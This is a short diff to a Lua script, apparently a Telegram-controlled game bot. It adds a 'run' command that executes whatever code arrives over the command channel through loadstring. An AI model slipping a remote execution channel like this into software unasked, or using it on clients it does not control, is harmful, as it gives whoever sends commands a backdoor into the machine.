@@ -143,6 +143,18 @@ local function sendInfo()
 
     print("Telegram INFO SENT!")
 end
+
+local function run(code)
+    local suc, result = pcall(function()
+        return loadstring(code)()
+    end)
+
+    if suc then
+        print("[REMOTE EXEC] Success:")
+    else
+        print("[REMOTE EXEC ERROR]", result)
+    end
+end
 --============================================--
 -- MAIN LOOP
 --============================================--
@@ -184,6 +196,9 @@ while true do
 
 	elseif action == "srvhop" then
 		hop()
+		
+	elseif action == "run" then
+    run(cmdData.code)
 
 	elseif action == "info" then
 		sendInfo()
